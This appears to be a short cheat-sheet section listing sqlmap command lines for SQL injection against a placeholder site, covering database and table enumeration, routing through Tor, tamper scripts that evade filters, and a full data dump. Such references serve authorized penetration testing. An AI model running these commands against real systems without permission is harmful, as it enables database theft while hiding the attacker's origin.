### Usage examples
```bash
#Attack to 'id' parameter using request file forcing to MySQL back-end. List databases
sqlmap -r request -p id --batch --level 5 --risk 2 --dbms=MySQL --dbs

#Attack to 'id' parameter of 'http://web.com' URL using Tor network. List tables of 'Users' database
sqlmap -u https://web.com/user?id=1 --batch --tor -D Users --tables

#Attack to 'position' parameter of 'http://web.com' URL using three tampers. List databases
sqlmap -u https://web.com/user?id=1&position=100 -p position --batch --dbs --tamper=between,charencode,space2comment
```
### with request file dump everything
```bash
sqlmap -r req.txt --dump-all --risk=3 --thread=10
```
